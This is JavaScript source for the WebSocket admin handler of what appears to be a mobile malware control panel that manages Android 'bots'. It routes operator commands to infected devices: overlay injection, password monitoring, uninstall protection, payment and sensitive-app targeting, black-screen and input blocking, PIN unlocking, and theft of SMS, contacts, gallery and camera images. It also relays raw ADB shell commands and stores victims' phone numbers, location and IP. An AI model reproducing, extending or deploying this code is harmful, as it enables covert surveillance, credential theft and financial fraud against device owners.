'use strict';

const { getPool } = require('../services/commandPoller');
const { FrameThrottle } = require('../services/frameThrottle');
const {
  isSuperAdmin,
  canAccessDevice,
  listAuthorizedDevices,
} = require('../services/deviceAccess');
const config = require('../../config');

const frameThrottle = new FrameThrottle(config.maxFps);
let adminConnectionSequence = 0;
const MAX_STREAM_BUFFER_BYTES = 2 * 1024 * 1024;
const HIGH_VOLUME_MESSAGE_TYPES = new Set([
  'screenshot',
  'screen',
  'frame',
  'screen_frame',
  'ui_hierarchy',
  'accessibility_data',
  'accessibility_dump',
  'reader_data',
]);

/**
 * 管理端 WebSocket handler
 * 路径: /ws/panel?token=xxx
 */
function handleAdmin(ws, user, connections) {
  // App-level and device-control sockets commonly connect in the same
  // millisecond. A timestamp-only key lets one socket overwrite the other,
  // and either close event then removes the surviving socket from the map.
  adminConnectionSequence = (adminConnectionSequence + 1) % Number.MAX_SAFE_INTEGER;
  const tokenId = `admin-${user.user_id}-${Date.now()}-${adminConnectionSequence}`;
  connections.admins.set(tokenId, {
    ws,
    user,
    ownerScope: isSuperAdmin(user) ? null : new Set(),
    authorizedDeviceIds: isSuperAdmin(user) ? null : new Set(),
  });
  console.log(`[WS-Admin] Connected: ${user.username} (${tokenId})`);

  // 发送初始设备列表
  sendDeviceList(ws, connections, user, tokenId)
    .catch(err => console.error('[WS-Admin] sendDeviceList failed:', err.message));

  ws.on('message', (data) => {
    // ★ Stability: wrap entire handler body in try/catch to prevent unhandled
    // exceptions in handler/forwarding logic from crashing the WS server.
    try {
      try {
        // 二进制帧处理：可能是 msgpack 或其他编码
        if (Buffer.isBuffer(data)) {
          console.log(`[WS-Admin] ${user.username} sent binary data (${data.length} bytes)`);
          console.log(`[WS-Admin] Binary hex (first 20 bytes):`, data.slice(0, 20).toString('hex'));
          console.log(`[WS-Admin] Binary as string attempt:`, data.toString('utf8').substring(0, 100));

          // 尝试解析为 JSON（某些客户端可能发送 UTF-8 编码的 JSON 但设置了 binaryType）
          try {
            const msg = JSON.parse(data.toString('utf8'));
            console.log(`[WS-Admin] <<<< Binary parsed as JSON from ${user.username}:`, JSON.stringify(msg));
            handleAdminMessage(ws, msg, user, connections, tokenId)
              .catch(err => console.error(`[WS-Admin] message denied/failed for ${user.username}:`, err.message));
            return;
          } catch (jsonErr) {
            console.error(`[WS-Admin] Binary data is NOT JSON:`, jsonErr.message);
            // 暂时忽略非JSON二进制数据（可能是屏幕帧）
            return;
          }
        }

        const msg = JSON.parse(data.toString());
        console.log(`[WS-Admin] <<<< Received from ${user.username}:`, JSON.stringify(msg));
        handleAdminMessage(ws, msg, user, connections, tokenId)
          .catch(err => console.error(`[WS-Admin] message denied/failed for ${user.username}:`, err.message));
      } catch (err) {
        console.error('[WS-Admin] Parse error:', err.message, 'data:', data.toString().substring(0, 100));
      }
    } catch (err) {
      console.error(`[WS-Admin] Unhandled error in message handler for ${user.username}:`, err && err.message ? err.message : err);
    }
  });

  ws.on('close', (code, reason) => {
    connections.admins.delete(tokenId);
    console.log(`[WS-Admin] Disconnected: ${user.username} code=${code} reason=${reason || ''}`);
  });

  ws.on('error', (err) => {
    connections.admins.delete(tokenId);
    console.error(`[WS-Admin] Error: ${err.message}`);
  });
}

async function handleAdminMessage(ws, msg, user, connections, tokenId) {
  const { type, deviceId, sessionId, data } = msg;
  const targetDevice = deviceId || sessionId || '';

  // 所有订阅、状态读取和命令转发在进入分支前统一校验设备归属。
  // superadmin=全部；admin=自己+直属子账号；user=仅自己。
  const noTargetCheck = new Set(['ping', 'get_bot_list', 'get_device_list', 'unsubscribe', 'unsubscribe_device']);
  if (targetDevice && !noTargetCheck.has(type)) {
    const db = getPool();
    if (!(await canAccessDevice(db, user, targetDevice))) {
      console.warn(`[WS-Admin] ACCESS DENIED user=${user.username} role=${user.role} device=${targetDevice} type=${type}`);
      if (ws.readyState === 1) {
        ws.send(JSON.stringify({ type: 'access_denied', deviceId: targetDevice, message: 'Device not found' }));
      }
      return;
    }
  }

  switch (type) {
    case 'subscribe':
    case 'subscribe_device':
      // 管理端订阅设备
      if (targetDevice) {
        const myConn = connections.admins.get(tokenId);
        if (myConn) {
          if (!myConn.subscribedDevices) myConn.subscribedDevices = new Set();
          myConn.subscribedDevices.add(targetDevice);
        }
        console.log(`[WS-Admin] ${user.username} subscribed to ${targetDevice}`);
      }
      break;

    case 'unsubscribe':
    case 'unsubscribe_device':
      if (targetDevice) {
        const myConn2 = connections.admins.get(tokenId);
        if (myConn2 && myConn2.subscribedDevices) myConn2.subscribedDevices.delete(targetDevice);
        console.log(`[WS-Admin] ${user.username} unsubscribed from ${targetDevice}`);
      }
      break;

    case 'command':
      // 管理端发送命令到设备
      console.log(`[WS-Admin] Command type='command', targetDevice=${targetDevice}, data=`, JSON.stringify(data));
      if (targetDevice && data) {
        forwardCommandToDevice(targetDevice, data, connections);
      } else {
        console.warn(`[WS-Admin] Command DROPPED: targetDevice=${targetDevice}, data=${!!data}`);
      }
      break;

    case 'get_bot_list':
    case 'get_device_list':
      // 前端请求设备列表
      sendDeviceList(ws, connections, user, tokenId)
        .catch(err => console.error('[WS-Admin] sendDeviceList error:', err.message));
      break;

    case 'get_device_state':
      // 获取设备状态
      if (targetDevice) {
        const device = connections.devices.get(targetDevice);
        if (device && device.ws.readyState === 1) {
          device.ws.send(JSON.stringify({ type: 'command', sessionId: targetDevice, data: { command: 'GET_DEVICE_STATE', params: {} } }));
        }
      }
      break;

    case 'ping':
      ws.send(JSON.stringify({ type: 'pong' }));
      break;

    case 'adb_shell':
      // ADB Shell 命令转发
      console.log(`[WS-Admin] adb_shell forward: targetDevice=${targetDevice}, command=${msg.command}`);
      if (targetDevice) {
        // 对 bridge 特殊处理：转换为 local-service 理解的格式
        const bridge2 = connections.bridges.get(targetDevice);
        if (bridge2 && bridge2.ws.readyState === 1) {
          const shellPayload = JSON.stringify({ command: 'adb_shell', params: { cmd: msg.command, ...(msg.params || {}) } });
          console.log(`[WS-Admin] >>>> Sending adb_shell to BRIDGE ${targetDevice}:`, shellPayload.substring(0, 200));
          bridge2.ws.send(shellPayload);
        } else {
          // 发给 APK device
          const device2 = connections.devices.get(targetDevice);
          if (device2 && device2.ws.readyState === 1) {
            device2.ws.send(JSON.stringify(msg));
          }
        }
      }
      break;

    case 'adb_tunnel':
      // ADB Tunnel 命令转发
      console.log(`[WS-Admin] adb_tunnel forward: targetDevice=${targetDevice}, command=${msg.command}`);
      if (targetDevice) {
        const bridge3 = connections.bridges.get(targetDevice);
        if (bridge3 && bridge3.ws.readyState === 1) {
          const tunnelPayload = JSON.stringify({ command: msg.command || 'adb_tunnel', params: msg.params || {} });
          console.log(`[WS-Admin] >>>> Sending adb_tunnel to BRIDGE ${targetDevice}:`, tunnelPayload.substring(0, 200));
          bridge3.ws.send(tunnelPayload);
        } else {
          const device3 = connections.devices.get(targetDevice);
          if (device3 && device3.ws.readyState === 1) {
            device3.ws.send(JSON.stringify(msg));
          }
        }
      }
      break;

    default:
      // 转发到设备
      console.log(`[WS-Admin] Default forward: type='${type}', targetDevice=${targetDevice}, msg=`, JSON.stringify(msg).substring(0, 200));
      if (targetDevice) {
        forwardCommandToDevice(targetDevice, msg, connections);
      } else {
        console.warn(`[WS-Admin] Default forward DROPPED - no targetDevice. type='${type}'`);
      }
  }
}

function forwardCommandToDevice(deviceId, data, connections) {
  console.log(`[WS-Admin] forwardCommandToDevice(${deviceId}), bridges.has=${connections.bridges.has(deviceId)}, devices.has=${connections.devices.has(deviceId)}`);

  const bridge = connections.bridges.get(deviceId);
  const device = connections.devices.get(deviceId);
  let sent = false;

  // 提取命令名称（用于判断路由）
  let cmdName = '';
  if (data && data.command) cmdName = data.command;
  else if (data && data.data && data.data.command) cmdName = data.data.command;

  // Bridge 专属命令（仅发给 bridge）
  const bridgeOnlyCommands = ['adb_shell', 'adb_tunnel', 'INSTALL_APK', 'FILE_PUSH', 'FILE_PULL'];
  // Device（无障碍）专属命令（仅发给 device，不发 bridge）
  const deviceOnlyCommands = [
    'POWER_SLEEP', 'POWER_WAKE', 'SCREEN_CAPTURE', 'SCREEN_CAPTURE_STOP', 'SCREEN_CAPTURE_START',
    'SCREEN_RECORD', 'SCREEN_RECORD_START', 'SCREEN_RECORD_STOP',
    'SCREENCAST', 'SYSTEM_SCREENCAST', 'STOP_SCREENCAST', 'SCREEN_CAPTURE_SET_TECH',
    'SCREEN_QUALITY',
    'CAMERA_STOP', 'CAMERA_START', 'CAMERA_CAPTURE',
    'GET_UI_HIERARCHY', 'GET_READER_DATA', 'READER_START', 'READER_STOP',
    'SHOW_INJECTION', 'STOP_INJECTION', 'GET_PASSWORD_STATUS',
    'ENABLE_PASSWORD_MONITORING', 'DISABLE_PASSWORD_MONITORING',
    'ENABLE_UNINSTALL_PROTECTION', 'DISABLE_UNINSTALL_PROTECTION',
    'DEPLOY_LOCAL_SERVICE', 'FULL_DEPLOY', 'MUTE', 'DEVICE_BLOCK_INPUT', 'DEVICE_ALLOW_INPUT',
    'ENABLE_BLACK_SCREEN', 'DISABLE_BLACK_SCREEN', 'SMART_NUMERIC_UNLOCK', 'UNLOCK_DEVICE',
    'SET_PAYMENT_STRATEGIES', 'SET_SENSITIVE_APPS', 'SET_BLACK_APPS',
    'lockScreen', 'SCREEN_OFF', 'SYSTEM_LOCK_SCREEN', 'home', 'back', 'recent',
    'swipe', 'SWIPE', 'SWIPE_PATH', 'swipe_path', 'TAP', 'tap', 'CLICK', 'click',
    'GET_CONTACTS', 'GET_GALLERY', 'GET_APPS', 'GET_SMS',
    'disableAccessibility', 'enableAccessibility',
  ];

  const isBridgeOnly = bridgeOnlyCommands.includes(cmdName);
  const isDeviceOnly = deviceOnlyCommands.includes(cmdName);

  // 发送给 Device（APK 无障碍服务）
  if (!isBridgeOnly && device && device.ws.readyState === 1) {
    // APK 期望: { type: 'command', sessionId, data: { command, params } }
    const cmdPayload = JSON.stringify({ type: 'command', sessionId: deviceId, data });
    console.log(`[WS-Admin] >>>> Sending to DEVICE ${deviceId}:`, cmdPayload.substring(0, 200));
    device.ws.send(cmdPayload);
    sent = true;
  }

  // 发送给 Bridge（local-service）
  if (!isDeviceOnly && bridge && bridge.ws.readyState === 1) {
    let bridgePayload;
    if (data && data.command) {
      bridgePayload = { command: data.command, params: data.params || {} };
    } else if (data && data.data && data.data.command) {
      bridgePayload = { command: data.data.command, params: data.data.params || {} };
    } else {
      bridgePayload = data;
    }
    const bridgeStr = JSON.stringify(bridgePayload);
    console.log(`[WS-Admin] >>>> Sending to BRIDGE ${deviceId}:`, bridgeStr.substring(0, 200));
    bridge.ws.send(bridgeStr);
    sent = true;
  }

  if (!sent) {
    console.warn(`[WS-Admin] >>>> NO ROUTE for ${deviceId}! No bridge or device connection available.`);
  }
}

/**
 * 广播消息给管理端
 * 全局消息（bot_list、device_update、bot_online/offline）发给所有 admin
 * 设备特定消息（有 deviceId/sessionId）只发给订阅了该设备的 admin
 */
function broadcastToAdmins(connections, msg) {
  const msgDeviceId = (typeof msg === 'object') ? (msg.deviceId || msg.sessionId || '') : '';
  
  // 全局消息类型 — 发给所有 admin
  const globalTypes = ['bot_list', 'device_update', 'bot_online', 'bot_offline', 'device_online', 'device_offline', 'pong'];
  const msgType = (typeof msg === 'object') ? (msg.type || '') : '';
  const isGlobal = !msgDeviceId || globalTypes.includes(msgType);
  const isHighVolume = HIGH_VOLUME_MESSAGE_TYPES.has(String(msgType).toLowerCase());

  for (const [, conn] of connections.admins) {
    if (conn.ws.readyState !== 1) continue;

    // 任何带设备 ID 的事件都必须经过连接级授权集合；不能因为事件类型叫
    // device_update/bot_online 就把其它账号设备的状态广播出去。
    if (msgDeviceId && conn.authorizedDeviceIds !== null && !conn.authorizedDeviceIds?.has(msgDeviceId)) {
      continue;
    }

    let payload = typeof msg === 'string' ? msg : JSON.stringify(msg);
    if (typeof msg === 'object' && Array.isArray(msg.data) && ['bot_list', 'device_list'].includes(msgType)) {
      const filtered = conn.ownerScope === null
        ? msg.data
        : msg.data.filter(device => conn.ownerScope?.has(String(device.ownerUsername || device.owner_username || '')));
      payload = JSON.stringify({ ...msg, data: filtered });
    }
    
    if (isGlobal) {
      // 全局消息发给所有人
      conn.ws.send(payload);
    } else {
      // 设备特定消息只发给明确订阅该设备的控制页面。Dashboard 的
      // 空订阅连接不需要截图、阅读器层级或设备操作结果。
      if (!conn.subscribedDevices?.has(msgDeviceId)) continue;

      // 慢客户端已经积压时丢弃旧的高频帧，等待下一帧追上实时状态，
      // 避免几分钟后才显示过期画面和操作结果。
      if (isHighVolume && conn.ws.bufferedAmount > MAX_STREAM_BUFFER_BYTES) continue;
      conn.ws.send(payload);
    }
  }
}

/**
 * 转发二进制帧给订阅了该设备的管理端（带节流）
 */
function forwardFrameToAdmins(deviceId, frameData, connections) {
  if (!frameThrottle.canSend(deviceId)) return;

  for (const [, conn] of connections.admins) {
    if (conn.ws.readyState !== 1) continue;
    if (conn.authorizedDeviceIds !== null && !conn.authorizedDeviceIds?.has(deviceId)) continue;
    if (!conn.subscribedDevices?.has(deviceId)) continue;
    if (conn.ws.bufferedAmount > MAX_STREAM_BUFFER_BYTES) continue;
    conn.ws.send(frameData);
  }
}

async function sendDeviceList(ws, connections, user, tokenId) {
  try {
    const db = getPool();
    const { rows, scope } = await listAuthorizedDevices(db, user);
    const devices = rows.map(row => {
      const d = deviceToDict(row);
      // 注入实时 WS 连接状态
      const wsConn = connections ? connections.devices.has(d.deviceId) : false;
      const bridgeConn = connections ? connections.bridges.has(d.deviceId) : false;
      d.ws_connected = wsConn;
      d.bridge_connected = bridgeConn;
      // 基于 WS 实时连接判断状态（与 PHP getOnlineDevices 一致）
      if (wsConn || bridgeConn) {
        // 有 WS 连接 → 判断是否休眠（屏幕关闭）
        const isScreenOn = row.is_screen_on === 1 || row.is_screen_on === true;
        d.status = isScreenOn ? 'online' : 'sleeping';
      } else {
        d.status = 'offline';
      }
      return d;
    });
    const conn = tokenId ? connections?.admins?.get(tokenId) : null;
    if (conn) {
      conn.ownerScope = scope === null ? null : new Set(scope);
      conn.authorizedDeviceIds = scope === null ? null : new Set(devices.map(device => device.deviceId));
    }
    // 发送 bot_list 格式（前端 ControlPage 期望此类型）
    ws.send(JSON.stringify({ type: 'bot_list', data: devices }));
    // 同时发送 device_list 格式（App.jsx 使用）
    ws.send(JSON.stringify({ type: 'device_list', data: devices }));
  } catch (err) {
    console.error('[WS-Admin] sendDeviceList error:', err.message);
  }
}

function deviceToDict(row) {
  const deviceId = row.device_id || '';
  const brand = (row.brand || '').toUpperCase() || 'UNKNOWN';
  let permissions = {};
  try {
    let permStr = row.permissions || '{}';
    // MySQL JSON 列可能返回 Buffer
    if (Buffer.isBuffer(permStr)) permStr = permStr.toString('utf8');
    if (typeof permStr === 'object' && permStr !== null) {
      permissions = permStr; // 已经是对象
    } else {
      permissions = JSON.parse(permStr);
    }
  } catch { permissions = {}; }

  // 时间戳转毫秒（前端需要毫秒级）
  const toMs = (ts) => ts ? (ts < 10000000000 ? ts * 1000 : ts) : null;

  return {
    id: deviceId,
    deviceId,
    botId: deviceId,
    name: deviceId ? `${brand}-${deviceId.slice(-8).toUpperCase()}` : '',
    model: row.model || '',
    osVersion: row.os_version || '',
    appName: row.app_name || '',
    appVersion: row.app_version || '',
    batteryLevel: row.battery_level || 0,
    networkType: row.network_type || '',
    status: row.is_connected ? 'online' : 'offline',
    localServiceConnected: !!row.local_service_connected,
    ownerUsername: row.owner_username || '',
    groupName: row.group_name || '',
    permissions,
    // 关键时间戳字段
    lastSeen: toMs(row.last_seen),
    lastHeartbeat: toMs(row.last_seen), // 前端优先读这个
    firstInstallTime: toMs(row.first_seen),
    // 其他字段
    publicIP: row.public_ip || '',
    phoneNumber: row.phone_number || '',
    phoneNumber2: row.phone_number_2 || '',
    screenWidth: row.screen_width || 0,
    screenHeight: row.screen_height || 0,
    hasSim: !!row.has_sim,
    accessibilityAlive: !!row.accessibility_alive,
    isScreenOn: !!row.is_screen_on,
    isCharging: !!row.is_charging,
    isLocked: !!row.is_locked,
    geoLocation: row.geo_location || null,
    remark: row.remark || '',
    injection_active: !!row.injection_active,
    adb_enabled: !!row.adb_enabled,
    adb_wifi_enabled: !!row.adb_wifi_enabled,
    adb_deploy_enabled: !!row.adb_deploy_enabled,
    wifi_port: row.wifi_port || 0,
  };
}

module.exports = { handleAdmin, broadcastToAdmins, forwardFrameToAdmins };
